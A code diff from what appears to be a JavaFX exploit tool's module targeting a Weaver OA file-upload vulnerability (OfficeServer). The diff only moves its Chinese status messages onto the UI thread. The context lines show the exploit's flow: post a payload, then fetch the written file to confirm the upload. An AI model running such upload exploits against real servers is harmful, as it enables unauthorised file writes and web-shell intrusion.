@@ -4,6 +4,7 @@ import core.Exploitlnterface;
 import java.util.HashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
 import utils.Response;
@@ -62,26 +63,35 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface {
 
             Response sec = HttpTools.post(url + "/OfficeServer", sec_post, this.headers, "utf-8");
             if (sec.getCode() == 200 && sec.getText().contains(shell.test_payload)) {
-
-                textArea.appendText("\n 释放成功 检测写入状态");
+                Platform.runLater(()->{
+                    textArea.appendText("\n 释放成功 检测写入状态");
+                });
                 Response thired = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
 
                 if (thired.getText().contains(shell.test_payload)) {
-                    textArea.appendText("\n 漏洞存在，测试文件写入成功 \n " + url + "/" + filename);
+                    Platform.runLater(()->{
+                        textArea.appendText("\n 漏洞存在，测试文件写入成功 \n " + url + "/" + filename);
+                    });
                     return true;
                 } else {
-                    textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
+                    Platform.runLater(()->{
+                        textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
+                    });
                     return false;
                 }
 
             } else {
-                textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
+                Platform.runLater(()->{
+                    textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
+                });
                 return false;
             }
 
 
         } else {
-            textArea.appendText("\n weaveroa_workrelate_uploadOperation - 漏洞不存在 (出现误报请联系作者)");
+            Platform.runLater(()->{
+                textArea.appendText("\n weaveroa_workrelate_uploadOperation - 漏洞不存在 (出现误报请联系作者)");
+            });
             return false;
         }
 
